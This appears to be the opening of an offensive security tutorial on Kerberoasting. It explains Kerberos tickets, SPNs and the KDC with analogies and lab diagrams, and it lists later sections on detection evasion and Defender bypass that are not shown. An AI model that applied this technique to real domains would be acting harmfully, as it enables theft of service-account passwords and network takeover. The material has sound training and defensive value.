# KERBEROASTING: THE COMPLETE GUIDE
## From Zero Understanding to Cracking Service Account Passwords

> **Before we attack Kerberos, we need to DEEPLY understand it.**
>
> Many tutorials jump straight into commands. But if you don't understand:
> - What is the KDC? Is it software? A server? A protocol?
> - Where exactly does it live - on-premise or cloud?
> - What are "tickets" really? Like movie tickets?
> - What is an SPN? Why does it exist?
>
> ...then you'll just be running commands without understanding.
>
> **This guide explains EVERYTHING from absolute zero.**

---

# TABLE OF CONTENTS

**ABSOLUTE FUNDAMENTALS (NEW!)**
0. [The God-Level Explanation](#part-0-fundamentals) ⬅️ START HERE!

**FOUNDATIONAL KNOWLEDGE**
1. [Kerberos Protocol Internals](#part-1-kerberos-internals)
2. [Ticket Structure and Encryption](#part-2-ticket-structure)
3. [Service Principal Names Deep Dive](#part-3-spn-internals)
4. [Why Kerberoasting Works](#part-4-why-it-works)

**ADVERSARY TRADECRAFT**
5. [Target Selection and Prioritization](#part-5-target-selection)
6. [APT Kerberoasting Techniques](#part-6-apt-tradecraft)
7. [Evading Detection](#part-7-evasion)

**PRACTICAL EXECUTION**
8. [Lab Setup](#part-8-lab-setup)
9. [The Attack with Defender Bypass](#part-9-attack-execution)
10. [Cracking Methodology](#part-10-cracking)

**OPERATIONAL**
11. [Post-Exploitation](#part-11-post-exploitation)
12. [Interview Questions (15+)](#part-12-interview)
13. [Troubleshooting](#part-13-troubleshoot)

---

# PART 0: The God-Level Explanation of Kerberos {#part-0-fundamentals}

> **🎓 WHY THIS SECTION EXISTS:**
>
> Most tutorials tell you: "Run Rubeus, get hashes, crack them, done."
> 
> But you're left confused:
> - What exactly IS Kerberos? Is it a server? Software? A protocol?
> - Where does the KDC "live"? In the cloud? On-premise?
> - What are these "tickets" everyone talks about?
> - Why can ANY user request a ticket for ANY service?
> - How does cracking even work on encrypted data?
>
> **This section answers EVERYTHING from absolute zero.**
> **No assumptions. No jargon without explanation.**

---

## 0.1: What is Kerberos? (Like You're Explaining to Your Mom)

Let's start with the absolute basics.

**First, what does "authentication" mean?**

Imagine you go to a bank. Before they give you money, they ask: "Who are you?"
You show your ID card. They verify it. Now they know you are who you claim to be.

Authentication = **Proving your identity**

---

**So what is Kerberos?**

Kerberos is a **set of rules** (we call it a "protocol") that Windows computers follow to prove who you are.

Think of it like this:
- **English** is a protocol for humans to communicate
- **HTTP** is a protocol for websites to send data
- **Kerberos** is a protocol for Windows to authenticate users

**Kerberos is NOT:**
- ❌ A server you can touch or see
- ❌ A cloud service like Gmail
- ❌ A separate software you install
- ❌ Something only in Azure or AWS

**Kerberos IS:**
- ✅ A protocol (set of rules)
- ✅ Built into Windows since Windows 2000
- ✅ The DEFAULT way Active Directory authenticates
- ✅ Named after Cerberus, the 3-headed dog from Greek mythology (because it has 3 parts: client, server, KDC)

---

## 0.2: Where Does Kerberos "Live"? (The Domain Controller Confusion)

This confuses EVERYONE at first. Let me clear it up completely.

**Think of your company's Active Directory like this:**

```
YOUR COMPANY NETWORK:
────────────────────────────────────────────────────────────────

┌─────────────────────────────────────────────────────────────┐
│                                                              │
│                   DOMAIN CONTROLLER (DC01)                   │
│                   IP: 192.168.100.10                        │
│                                                              │
│   This is just a Windows Server computer sitting in your    │
│   server room or data center (or maybe in AWS/Azure VM)     │
│                                                              │
│   ┌───────────────────────────────────────────────────────┐ │
│   │                                                        │ │
│   │  When you install "Active Directory" on this server,  │ │
│   │  Windows automatically starts several SERVICES:        │ │
│   │                                                        │ │
│   │  ┌──────────────────────────────────────────────────┐ │ │
│   │  │  📌 KDC (Key Distribution Center)                │ │ │
│   │  │     - This issues Kerberos tickets               │ │ │
│   │  │     - Listens on port 88 (TCP/UDP)               │ │ │
│   │  │     - This is what we're attacking!              │ │ │
│   │  └──────────────────────────────────────────────────┘ │ │
│   │                                                        │ │
│   │  ┌──────────────────────────────────────────────────┐ │ │
│   │  │  📌 LDAP (Lightweight Directory Access Protocol) │ │ │
│   │  │     - For querying user/group information        │ │ │
│   │  │     - Port 389/636                               │ │ │
│   │  └──────────────────────────────────────────────────┘ │ │
│   │                                                        │ │
│   │  ┌──────────────────────────────────────────────────┐ │ │
│   │  │  📌 DNS Service                                   │ │ │
│   │  │     - Resolves names like dc01.orsubank.local    │ │ │
│   │  │     - Port 53                                    │ │ │
│   │  └──────────────────────────────────────────────────┘ │ │
│   │                                                        │ │
│   └───────────────────────────────────────────────────────┘ │
│                                                              │
│   ┌───────────────────────────────────────────────────────┐ │
│   │  💾 NTDS.DIT (Active Directory Database)             │ │
│   │     - This file contains ALL the data:               │ │
│   │       • User accounts and password hashes            │ │
│   │       • Group memberships                            │ │
│   │       • Computer accounts                            │ │
│   │       • Stored in: C:\Windows\NTDS\ntds.dit          │ │
│   └───────────────────────────────────────────────────────┘ │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Key Understanding:**

1. **Domain Controller = A Windows Server computer** (physical or virtual)
2. **KDC = A service/program RUNNING on that server**
3. **KDC is part of Active Directory** - when you install AD, the KDC starts automatically
4. **Location:** Wherever your DC is - server room, data center, AWS, Azure

**Real-world analogy:**
- Domain Controller = Your college building
- KDC = The exam hall inside that building
- LDAP = The student records office inside that building
- DNS = The reception desk inside that building

They're all in the same building, but serve different purposes!

---

## 0.3: What is a "Ticket"? (The Movie Theater Analogy)

This is THE most important concept. Once you understand tickets, everything else makes sense.

**Let's use a real-world story:**

```
🎬 THE MOVIE THEATER STORY:
────────────────────────────────────────────────────────────────

SCENARIO: You want to watch 3 movies at a multiplex

❌ BAD WAY (What we DON'T want):
────────────────────────────────
1. Go to Movie 1 → Pay ₹200 → Show ID → Watch movie
2. Go to Movie 2 → Pay ₹200 → Show ID → Watch movie  
3. Go to Movie 3 → Pay ₹200 → Show ID → Watch movie

Problems:
- You pay EVERY time
- You show ID EVERY time  
- Cashier verifies you EVERY time
- Slow, inefficient, risky (what if you lose your ID?)

✅ BETTER WAY (Ticket-based):
──────────────────────────────
1. Morning: Go to ticket counter
   - Show ID ONCE
   - Pay ONCE
   - Get 3 TICKETS (one for each movie)

2. Throughout the day:
   - Movie 1: Show ticket → Enter (no ID needed!)
   - Movie 2: Show ticket → Enter (no payment needed!)
   - Movie 3: Show ticket → Enter (no verification needed!)

Benefits:
✅ Prove identity ONCE at the start
✅ Use tickets rest of the day
✅ Fast, efficient, secure
```

**Now let's map this to Kerberos:**

| Movie Theater | Kerberos/Windows | What It Means |
|---------------|------------------|---------------|
| You | Your username (vamsi.krishna) | The person trying to access things |
| Ticket Counter | KDC (on Domain Controller) | Where you prove your identity |
| Your ID Card | Your password | Proves who you are |
| Daily Pass Ticket | **TGT (Ticket Granting Ticket)** | Proves you logged in today |
| Movie Tickets | **TGS (Ticket Granting Service)** | Proves you can access specific things |
| Movies (1,2,3) | Services (File Server, SQL, Printer) | Things you want to access |

---

## 0.4: The Two Types of Tickets (Explained Simply)

Kerberos uses TWO types of tickets. This confuses everyone, so pay attention:

```
KERBEROS TICKET TYPES:
────────────────────────────────────────────────────────────────

TYPE 1: TGT (Ticket Granting Ticket)
─────────────────────────────────────
Real World: Your college ID card
In Kerberos: Proves you logged into the domain

When you get it: When you first log into Windows
How long it lasts: Usually 10 hours (then you need to refresh)
Who can decrypt it: Only the KDC (encrypted with KRBTGT account's password)

What it looks like:
┌──────────────────────────────────────────┐
│  🎫 TGT - Ticket Granting Ticket         │
├──────────────────────────────────────────┤
│  User: vamsi.krishna                     │
│  Domain: ORSUBANK.LOCAL                  │
│  Valid From: 9:00 AM                     │
│  Valid Until: 7:00 PM (10 hours)         │
│  Session Key: [random encryption key]    │
│                                          │
│  🔒 ENCRYPTED with KRBTGT's password    │
│  (Only KDC can decrypt this!)            │
└──────────────────────────────────────────┘


TYPE 2: TGS (Ticket Granting Service)
──────────────────────────────────────
Real World: Specific tickets (movie ticket, parking ticket)
In Kerberos: Proves you can access a SPECIFIC service

When you get it: When you want to access a service (file share, SQL, etc.)
How long it lasts: Usually 10 hours
Who can decrypt it: Only THAT service (encrypted with service's password!)

What it looks like:
┌──────────────────────────────────────────┐
│  🎫 TGS - Service Ticket for SQL Server  │
├──────────────────────────────────────────┤
│  User: vamsi.krishna                     │
│  Service: MSSQLSvc/sql.orsubank.local    │
│  Valid From: 10:30 AM                    │
│  Valid Until: 8:30 PM                    │
│  Session Key: [random key]               │
│                                          │
│  🔒 ENCRYPTED with svc_sql's password   │
│  (Only SQL service can decrypt this!)    │
└──────────────────────────────────────────┘
```

**The CRITICAL Difference:**
- **TGT** = Encrypted with **KRBTGT's** password (only KDC can read it)
- **TGS** = Encrypted with **SERVICE ACCOUNT's** password (only that service can read it)

👉 **THIS IS THE VULNERABILITY!** If we can get the TGS, we can try to crack the service password!

---

## 0.5: How Kerberos Works - The Complete Flow (Step by Step)

Let me walk you through EXACTLY what happens when you access a file server.

**SCENARIO:** You (vamsi.krishna) want to access `\\fileserver\documents`

```
THE COMPLETE KERBEROS FLOW:
────────────────────────────────────────────────────────────────

                  YOU                    KDC (DC01)           FILE SERVER
              (vamsi.krishna)        (192.168.100.10)     (\\fileserver)
                    │                       │                     │
                    │                       │                     │
═══════════════════════════════════════════════════════════════════════════
  PHASE 1: MORNING LOGIN - GET YOUR TGT (This happens when you log in)
═══════════════════════════════════════════════════════════════════════════
                    │                       │                     │
    You type your   │                       │                     │
    password and    │                       │                     │
    press Enter     │                       │                     │
                    │                       │                     │
                    │  1. AS-REQ            │                     │
                    │  "I'm vamsi.krishna,  │                     │
                    │   here's my timestamp │                     │
                    │   encrypted with my   │                     │
                    │   password hash"      │                     │
                    │──────────────────────>│                     │
                    │                       │                     │
                    │                       │  KDC checks:        │
                    │                       │  1. Does user exist?│
                    │                       │  2. Can I decrypt   │
                    │                       │     the timestamp?  │
                    │                       │  3. Is time correct?│
                    │                       │                     │
                    │  2. AS-REP            │  ✅ All good!       │
                    │  "Here's your TGT!"   │  Creates TGT        │
                    │<──────────────────────│                     │
                    │                       │                     │
    ✅ Login        │                       │                     │
    Successful!     │                       │                     │
    You now have    │                       │                     │
    a TGT in memory │                       │                     │
                    │                       │                     │
                    │                       │                     │
═══════════════════════════════════════════════════════════════════════════
  PHASE 2: ACCESSING FILE SERVER - GET SERVICE TICKET (TGS)
═══════════════════════════════════════════════════════════════════════════
                    │                       │                     │
    You double-     │                       │                     │
    click on        │                       │                     │
    \\fileserver    │                       │                     │
                    │                       │                     │
                    │  3. TGS-REQ           │                     │
                    │  "I have this TGT,    │                     │
                    │   now give me ticket  │                     │
                    │   for CIFS/fileserver"│                     │
                    │──────────────────────>│                     │
                    │                       │                     │
                    │                       │  KDC checks:        │
                    │                       │  1. Is TGT valid?   │
                    │                       │  2. Which account   │
                    │                       │     runs fileserver?│
                    │                       │  3. Gets that       │
                    │                       │     account's hash  │
                    │                       │                     │
                    │  4. TGS-REP           │  Creates TGS        │
                    │  "Here's your ticket  │  encrypted with     │
                    │   for fileserver!"    │  fileserver's       │
                    │<──────────────────────│  password! 🔥       │
                    │                       │                     │
    ✅ Got service  │                       │                     │
    ticket!         │                       │                     │
                    │                       │                     │
                    │                       │                     │
═══════════════════════════════════════════════════════════════════════════
  PHASE 3: ACCESS THE FILE SERVER - USE THE TICKET
═══════════════════════════════════════════════════════════════════════════
                    │                       │                     │
                    │  5. AP-REQ            │                     │
                    │  "Here's my ticket!"  │                     │
                    │───────────────────────────────────────────>│
                    │                       │                     │
                    │                       │      File Server:   │
                    │                       │      1. Decrypt     │
                    │                       │         with MY     │
                    │                       │         password    │
                    │                       │      2. Check user  │
                    │                       │         is valid    │
                    │                       │      3. Grant access│
                    │                       │                     │
                    │  6. AP-REP            │                     │
                    │  "Access granted!"    │                     │
                    │<───────────────────────────────────────────│
                    │                       │                     │
    ✅ You can now  │                       │                     │
    see the files!  │                       │                     │
```

**MAGIC MOMENT - Where the Vulnerability Happens:**

Notice in **Step 4** - the KDC encrypts your service ticket with the **fileserver's password**!

The KDC gives YOU this encrypted blob, and you can:
1. Save it
2. Take it home
3. Try to crack it offline
4. No one knows you're trying!

This is Kerberoasting! 🎯

---

## 0.6: What is an SPN? (The Phone Book Analogy)

**SPN = Service Principal Name**

Think of it as a **phone number in a phone book**, but for services.

**Real-world analogy:**

```
📞 PHONE BOOK:
────────────────────────────────────────────────────────────────

Rajesh Kumar - Pizza Shop       → 9876543210
Priya Singh - Hospital          → 9876543211  
Amit Patel - Taxi Service       → 9876543212

When you want pizza, you look up "Rajesh - Pizza" and call 9876543210
```

**In Active Directory:**

```
📋 SPN "PHONE BOOK":
────────────────────────────────────────────────────────────────

SQL Server on DC01 port 1433    → MSSQLSvc/DC01.orsubank.local:1433
Web Server on web.orsubank      → HTTP/web.orsubank.local
Backup Service on DC01          → backup/dc01.orsubank.local
File Shares on fileserver       → CIFS/fileserver.orsubank.local

When you want to access SQL, you ask for ticket to "MSSQLSvc/DC01.orsubank.local:1433"
```

**SPN Format:**
```
serviceclass/hostname:port

Examples:
─────────
MSSQLSvc/DC01.orsubank.local:1433    ← SQL Server
HTTP/web.orsubank.local              ← Web Server  
backup/dc01.orsubank.local           ← Backup Service
CIFS/fileserver.orsubank.local       ← File Shares
```

**Where are SPNs stored?**

SPNs are stored in Active Directory as a PROPERTY on user accounts:

```
USER ACCOUNT: svc_sql
├── Name: SQL Service Account
├── Password: SqlSvc@2024!  ← THIS is what encrypts the ticket!
├── Groups: ServiceAccounts
└── servicePrincipalName: MSSQLSvc/DC01.orsubank.local:1433  ← SPN

When you request a ticket for "MSSQLSvc/DC01.orsubank.local:1433",
the KDC:
1. Looks up: "Which account has this SPN?"
2. Finds: svc_sql
3. Gets: svc_sql's password hash
4. Encrypts ticket with that hash
5. Gives you the encrypted ticket

👉 YOU can now try to crack svc_sql's password!
```

---

## 0.7: The Kerberoasting Vulnerability - Explained Like You're 5

Let me explain the vulnerability in the simplest possible way.

**Imagine this conversation:**

```
👤 YOU (vamsi.krishna): "Hey KDC, I need to access the SQL server"

🏛️ KDC: "Sure! Are you logged in?"

👤 YOU: "Yes, here's my TGT"

🏛️ KDC: "OK, let me create a ticket for SQL server...
        The SQL server is run by account 'svc_sql'...
        I'll encrypt this ticket with svc_sql's password...
        Here you go!"
        
        [Hands you encrypted blob]

👤 YOU: "Thanks!"

        [You take the encrypted blob home]
        
🏠 AT HOME ON YOUR LAPTOP:

👤 YOU: "Let me try to guess svc_sql's password...
        
        Try 'password123' → Decrypt → ❌ Doesn't work
        Try 'SqlSvc@2024!' → Decrypt → ✅ IT WORKS!
        
        I KNOW THE PASSWORD NOW!"
```

**Why this is a HUGE problem:**

| What Normal People Think | Reality |
|-------------------------|---------|
| "Only admins can get service passwords" | ❌ ANY user can request tickets |
| "There's a password lockout after 5 tries" | ❌ Cracking is OFFLINE, no lockout! |
| "SQL password must be strong" | ❌ Often weak: SqlSvc@2024! |
| "We'll detect if someone requests tickets" | ❌ Looks like normal Kerberos traffic! |
| "Service accounts aren't important" | ❌ Often have Domain Admin rights! |

---

## 0.8: Why Can ANY User Request Tickets? (The Design Decision)

This confuses everyone: "Why does AD let me request tickets for services I don't even use?"

**The design logic:**

```
MICROSOFT'S THINKING IN 2000:
────────────────────────────────────────────────────────────────

1. USER PERSPECTIVE:
   - You might need to access SQL later today
   - You might need to access File Server
   - We don't know WHAT you'll need
   - So we let you request tickets for ANYTHING
   
2. SECURITY PERSPECTIVE:
   - The ticket is ENCRYPTED
   - Only the service can decrypt it
   - So giving you an encrypted ticket is "safe"
   - You can't use it unless you're authorized
   
3. ASSUMPTIONS (This is where they went wrong):
   - Service accounts will have STRONG passwords (120+ chars)
   - OR they'll be computer accounts (auto-generated passwords)
   - Offline cracking will be computationally expensive
   - Network monitoring will catch suspicious requests
```

**What actually happened:**

```
REALITY IN 2024:
────────────────────────────────────────────────────────────────

1. Admins set weak passwords:
   ❌ svc_sql: SqlSvc@2024!
   ❌ svc_backup: Backup@2024!
   ❌ svc_web: WebServer123!
   
2. GPUs got FAST:
   ❌ RTX 3090 = 2.5 MILLION password attempts per second
   ❌ Can crack "SqlSvc@2024!" in minutes
   
3. Service accounts got over-privileged:
   ❌ svc_backup is in Domain Admins (why?!)
   ❌ svc_sql has local admin on 50 servers
   
4. Tools made it easy:
   ❌ Rubeus = One command to get all hashes
   ❌ Hashcat = Automatic cracking
   ❌ BloodHound = Shows which accounts are valuable
```

---

## 0.9: Where Does This Apply? (Cloud vs On-Premise Confusion)

**Big question:** "I heard my company uses Azure. Can I still Kerberoast?"

Let me clear this up:

```
DIFFERENT AD SETUPS:
────────────────────────────────────────────────────────────────

1. ON-PREMISE ACTIVE DIRECTORY (Traditional)
   ───────────────────────────────────────────
   Domain Controller: In your office/data center
   KDC Location: On your DC (192.168.x.x)
   Kerberoastable: ✅ YES
   
   Example: Most companies still use this!
   
2. AZURE AD (Pure Cloud)
   ───────────────────────
   Domain Controller: None! Microsoft manages it
   Authentication: OAuth/OIDC (not Kerberos)
   Kerberoastable: ❌ NO
   
   Example: Startups using only Microsoft 365
   
3. AZURE AD DOMAIN SERVICES (Managed AD in Cloud)
   ──────────────────────────────────────────────
   Domain Controller: Microsoft runs it for you
   KDC Location: In Azure (managed by Microsoft)
   Kerberoastable: ✅ YES
   
   Example: Companies migrating to cloud
   
4. HYBRID (On-Prem + Azure AD)
   ────────────────────────────
   Domain Controller: Both! (On-prem syncs to Azure)
   KDC Location: On your on-prem DC
   Kerberoastable: ✅ YES (on the on-prem side)
   
   Example: Most enterprises during migration
```

**For ORSUBANK lab:** We're using traditional on-premise AD, so Kerberoasting works perfectly!

---

## 0.10: Quick Self-Test - Do You Understand?

Before moving forward, test yourself:

```
QUIZ TIME! (Answer in your head)
────────────────────────────────────────────────────────────────

Q1: What is Kerberos?
A) A server   B) A protocol   C) A cloud service
👉 Answer: B - It's a set of rules (protocol)

Q2: Where does the KDC run?
A) In the cloud   B) On the Domain Controller   C) On your laptop
👉 Answer: B - It's a service running on the DC

Q3: What does a TGT prove?
A) You can access SQL   B) You logged in   C) You're an admin
👉 Answer: B - It proves you authenticated to the domain

Q4: What does a TGS prove?
A) You can access a specific service   B) You're admin   C) You logged in
👉 Answer: A - It's a ticket for ONE specific service

Q5: TGS tickets are encrypted with:
A) Your password   B) KRBTGT password   C) Service account's password
👉 Answer: C - That's the vulnerability!

Q6: Why can you crack TGS offline?
A) No lockout policy  B) It's on your computer  C) Both
👉 Answer: C - You have the encrypted blob, no one knows you're cracking

Q7: Who can request a ticket for SQL server?
A) Only SQL admins   B) Only Domain Admins   C) ANY domain user
👉 Answer: C - This is BY DESIGN (and the problem!)

Q8: What is an SPN?
A) Service password   B) Service address   C) Service account
👉 Answer: B - It's like a phone number for services
```

**If you got all 8 correct:** You understand Kerberos! Move to Part 1.

**If you got less than 6:** Re-read this section. The rest won't make sense without this foundation!

---

## 0.11: Summary - The Attack in 30 Seconds

**Here's the entire attack boiled down:**

```
KERBEROASTING IN 30 SECONDS:
────────────────────────────────────────────────────────────────

1. YOU: "KDC, give me a ticket for SQL server"
   
2. KDC: "Here's a ticket encrypted with svc_sql's password"
   
3. YOU: [Takes encrypted ticket]
   
4. YOU: [Tries millions of passwords on your laptop]
   
5. YOU: "Found it! Password is SqlSvc@2024!"
   
6. YOU: [Logs in as svc_sql]
   
7. IF svc_sql is Domain Admin:
   👑 GAME OVER - You own the domain!
```

**Why it works:**
- ✅ Any user can request tickets (by design)
- ✅ Tickets encrypted with service password (by design)  
- ✅ Service passwords often weak (human mistake)
- ✅ Cracking is offline (no detection)
- ✅ Service accounts often over-privileged (human mistake)

**This is not a bug - it's a feature we exploit!**

---

# PART 1: Kerberos Protocol Internals {#part-1-kerberos-internals}

> **🔍 WH AT WE'LL COVER:**  
>
> Part 0 gave you the bird's eye view - what Kerberos IS.  
> Part 1 will show you how it WORKS under the hood.
>
> Think of it like this:
> - Part 0 = Understanding what a car is
> - Part 1 = Opening the hood and seeing the engine

---

## 1.1: What is Kerberos Really Doing? (The Core Principle)

Now that you understand the basics, let's go deeper.

**The fundamental principle of Kerberos:**

> You prove your identity ONCE (with your password),  
> then use cryptographic tickets for EVERYTHING else.

**Let me explain why this is brilliant:**

```
🏫 IMAGINE A COLLEGE SCENARIO:
────────────────────────────────────────────────────────────────

BAD WAY (No Kerberos):
───────────────────────

You want to:
1. Enter Library → Guard asks: "Who are you?" → Show ID
2. Enter Canteen → Staff asks: "Who are you?" → Show ID  
3. Enter Lab → Teacher asks: "Who are you?" → Show ID
4. Enter Classroom → Professor asks: "Who are you?" → Show ID

Problems:
- You show ID 100 times a day
- Everyone needs to verify your ID
- Your ID card could be stolen/copied
- Slow, annoying, insecure

GOOD WAY (Kerberos):
─────────────────────

Morning: You go to main office
1. Show ID ONCE to office in-charge
2. They give you a COLLEGE PASS for the day
3. This pass has:
   - Your name
   - Your student ID
   - Valid until: 5 PM today
   - Stamp from office

Throughout the day:
- Library: Show pass → Enter (no ID verification!)
- Canteen: Show pass → Enter (no questions!)
- Lab: Show pass → Enter (instant!)
- Classroom: Show pass → Enter (smooth!)

Benefits:
✅ Prove identity ONCE in the morning
✅ Use pass all day
✅ Each place trusts the office's stamp
✅ Fast, convenient, secure
✅ If pass is lost, it expires at 5 PM anyway
```

**Now translate this to Kerberos:**

| College | Kerberos | Purpose |
|---------|----------|---------|
| Main Office | KDC | Where you prove identity |
| Your ID Card | Your password | Proves who you are |
| Daily Pass | TGT (Ticket Granting Ticket) | Proves you're logged in |
| Stamps for specific places | TGS (service tickets) | Access to specific services |
| 5 PM expiry | 10-hour ticket lifetime | Security through time limits |

**Why this design is genius:**

1. **Password security:** Your password only travels ONCE during login
2. **Scalability:** Services don't need to check with KDC for every access
3. **Delegation:** You can forward tickets to other services
4. **Time-limited:** Even if someone steals a ticket, it expires soon
5. **Mutual authentication:** Both user and service verify each other

---

## 1.2: The Three Actors (Who's Involved?)

Every Kerberos transaction involves 3 parties:

```
THE KERBEROS TRIANGLE:
────────────────────────────────────────────────────────────────

         KDC (Key Distribution Center)
         The "main office" in our analogy
         Running on Domain Controller
                    ▲
                   ╱ ╲
                  ╱   ╲
                 ╱     ╲
                ╱       ╲
               ╱         ╲
              ╱           ╲
             ╱             ╲
            ╱               ╲
           ╱                 ╲
          ╱      Issues       ╲      Verifies
         ╱      tickets        ╲      tickets
        ╱                       ╲
       ╱                         ╲
      ▼                           ▼
   CLIENT                      SERVICE
 (Your computer)            (SQL Server, File Share, etc.)
   - Has password            - Has password
   - Requests tickets        - Decrypts tickets
   - Uses services           - Grants access
```

**Let's understand each actor:**

### 1.2.1: The CLIENT (You)

```
CLIENT = Your computer / your user account
────────────────────────────────────────────────────────────────

What you have:
- Your username: vamsi.krishna
- Your password: (only you know this!)
- Your computer: WS01

What you do:
1. Login in the morning
2. Get TGT from KDC
3. When you need SQL: Request TGS from KDC
4. Use TGS to access SQL
5. Repeat for file shares, printers, etc.

Where you are:
- IP: 192.168.100.20 (WS01)
- Logged in as: ORSUBANK\vamsi.krishna
```

### 1.2.2: The KDC (Key Distribution Center)

```
KDC = The ticket-issuing authority
────────────────────────────────────────────────────────────────

Actually TWO services inside:

┌───────────────────────────────────────────────┐
│              KDC (on DC01)                    │
├───────────────────────────────────────────────┤
│                                               │
│  📌 AS (Authentication Service)               │
│     - Handles login requests                  │
│     - Verifies your password                  │
│     - Issues TGT                              │
│     - Only works when you first log in        │
│                                               │
│  📌 TGS (Ticket Granting Service)             │
│     - Handles service ticket requests         │
│     - Verifies your TGT                       │
│     - Issues service tickets (TGS)            │
│     - Works throughout your session           │
│                                               │
└───────────────────────────────────────────────┘

Location: DC01 (192.168.100.10)
Port: 88 (TCP/UDP)

What it knows:
- EVERYONE'S password hashes (from NTDS.dit)
- Which accounts run which services (SPNs)
- KRBTGT password (super secret!)
```

**Wait, what's KRBTGT?**

```
KRBTGT = The KDC's Own Account
────────────────────────────────────────────────────────────────

Think of it like this:

Your password encrypts things only YOU can decrypt.
KRBTGT's password encrypts things only KDC can decrypt.

When KDC creates your TGT:
- It encrypts it with KRBTGT's password
- Only KDC can read it (because only KDC knows KRBTGT password)
- You can't read your own TGT!
- You just carry it and show it

KRBTGT password:
- 128+ character random string
- Auto-generated by Windows
- Rotates very rarely
- If an attacker gets this → Golden Ticket Attack!
```

### 1.2.3: The SERVICE (What You Want to Access)

```
SERVICE = The resource you're trying to access
────────────────────────────────────────────────────────────────

Examples:
- SQL Server (MSSQLSvc/DC01.orsubank.local:1433)
- File Share (CIFS/fileserver.orsubank.local)
- Web Server (HTTP/web.orsubank.local)

What the service has:
- A service account (e.g., svc_sql)
- That account's password
- An SPN registered in AD

What the service does:
1. You show up with a TGS ticket
2. Service decrypts it with ITS password
3. Service reads: "This is vamsi.krishna, valid until 8 PM"
4. Service grants you access

THE VULNERABILITY:
─────────────────
Because the ticket is encrypted with the SERVICE's password,
if we can crack that password, we own the service!
```

---

## 1.3: The Complete Kerberos Flow (Step-by-Step Breakdown)

Alright, here's the FULL flow. I'll explain EVERY step.

**SCENARIO:** You (vamsi.krishna) just logged into WS01 and want to access the SQL database.

```
THE COMPLETE KERBEROS AUTHENTICATION FLOW:
────────────────────────────────────────────────────────────────

MORNING: You arrive at office, turn on WS01, type password
═══════════════════════════════════════════════════════════════

PHASE 1: Getting Your TGT (This happens at login)
──────────────────────────────────────────────────

            YOU (WS01)                      KDC (DC01)
         192.168.100.20              192.168.100.10:88
                │                            │
                │                            │
 You type:      │                            │
 Username: vamsi.krishna                    │
 Password: Password123!                     │
                │                            │
 Computer       │                            │
 calculates your│                            │
 password HASH  │                            │
 (NTLM hash)    │                            │
                │                            │
                │  ────── STEP 1: AS-REQ ────→
                │                            │
                │  "I'm vamsi.krishna"       │
                │  "Here's a timestamp       │
                │   encrypted with my        │
                │   password hash"           │
                │  "Please give me a TGT"    │
                │                            │
                │                          KDC thinks:
                │                          "Let me check..."
                │                          1. Does vamsi.krishna exist?
                │                             → Checks NTDS.dit → YES!
                │                          2. Can I decrypt timestamp?
                │                             → Uses vamsi's hash → YES!
                │                          3. Is timestamp recent?
                │                             → Within 5 min → YES!
                │                          4. OK, create TGT!
                │                             → Encrypts with KRBTGT
                │                            │
                │  ← ──── STEP 2: AS-REP ────
                │                            │
                │  "Here's your TGT!"        │
                │  "Use it to get service    │
                │   tickets all day"         │
                │  "Valid for 10 hours"      │
                │                            │
✅ LOGIN       │                            │
SUCCESSFUL!    │                            │
You now have   │                            │
a TGT saved in │                            │
memory         │                            │
                │                            │


11:00 AM: You want to access SQL Server
════════════════════════════════════════

PHASE 2: Getting Service Ticket (Happens when accessing SQL)
──────────────────────────────────────────────────────────────

            YOU (WS01)                      KDC (DC01)              SQL SERVER
         192.168.100.20              192.168.100.10:88         (DC01:1433)
                │                            │                         │
 You double-    │                            │                         │
 click SQL      │                            │                         │
 Management     │                            │                         │
 Studio         │                            │                         │
                │                            │                         │
 Computer       │                            │                         │
 needs ticket   │                            │                         │
 for SQL        │                            │                         │
                │                            │                         │
                │  ───── STEP 3: TGS-REQ ────→                        │
                │                            │                         │
                │  "I have this TGT"         │                         │
                │  "I want to access         │                         │
                │   MSSQLSvc/DC01:1433"      │                         │
                │  "Please give me a         │                         │
                │   service ticket"          │                         │
                │                            │                         │
                │                          KDC thinks:                │
                │                          "Let me process this..."   │
                │                          1. Is TGT valid?           │
                │                             → Decrypt with KRBTGT → YES!
                │                          2. Who runs MSSQLSvc/DC01:1433?
                │                             → Checks SPNs → svc_sql
                │                          3. Get svc_sql's password hash
                │                             → From NTDS.dit
                │                          4. Create service ticket
                │                             → Encrypt with svc_sql's hash! 🔥
                │                          5. This is THE vulnerability!
                │                            │                         │
                │  ← ──── STEP 4: TGS-REP ───                         │
                │                            │                         │
                │  "Here's your service      │                         │
                │   ticket for SQL!"         │                         │
                │  [Encrypted blob]          │                         │
                │  "Show this to SQL server" │                         │
                │                            │                         │
✅ GOT         │                            │                         │
SERVICE        │                            │                         │
TICKET!        │                            │                         │
                │                            │                         │
⚠️  THIS       │                            │                         │
TICKET IS      │                            │                         │
ENCRYPTED WITH │                            │                         │
svc_sql's      │                            │                         │
PASSWORD!      │                            │                         │
                │                            │                         │


PHASE 3: Accessing SQL Server (Using the ticket)
──────────────────────────────────────────────────

            YOU (WS01)                                          SQL SERVER
         192.168.100.20                                       (DC01:1433)
                │                                                   │
                │  ─────────── STEP 5: AP-REQ ───────────────────→ │
                │                                                   │
                │  "Here's my service ticket"                       │
                │  [Shows encrypted ticket]                         │
                │                                                   │
                │                                              SQL thinks:
                │                                              "Let me verify..."
                │                                              1. Decrypt with MY password
                │                                                 → Uses svc_sql's password
                │                                              2. Is ticket valid?
                │                                                 → Checks timestamp → YES!
                │                                              3. Who is this for?
                │                                                 → vamsi.krishna
                │                                              4. OK, grant access!
                │                                                   │
                │  ← ────────── STEP 6: AP-REP ──────────────────  │
                │                                                   │
                │  "Access granted!"                                │
                │  "You can now query database"                     │
                │                                                   │
✅ ACCESSING   │                                                   │
SQL NOW!       │                                                   │
```

**THE MAGIC MOMENT - Understanding the Vulnerability:**

Look at **STEP 4** carefully:

```
🔥 VULNERABILITY EXPLAINED:
────────────────────────────────────────────────────────────────

In STEP 4, the KDC:
1. Checks: "Who runs MSSQLSvc/DC01:1433?" → svc_sql
2. Gets: svc_sql's password hash from NTDS.dit
3. Encrypts service ticket with that hash
4. Gives YOU the encrypted ticket

YOU now have:
- An encrypted blob
- It's encrypted with svc_sql's password
- You can take it home
- Try to crack it offline
- NO ONE KNOWS you're trying!

If you crack it:
- You get svc_sql's password: "MYpassword123#"
- You can log in as svc_sql
- If svc_sql is Domain Admin → GAME OVER!

This is Kerberoasting! 🎯
```

---

## 1.4: The Cryptographic Keys - Who Knows What?

This is important - different passwords/keys encrypt different things.

```
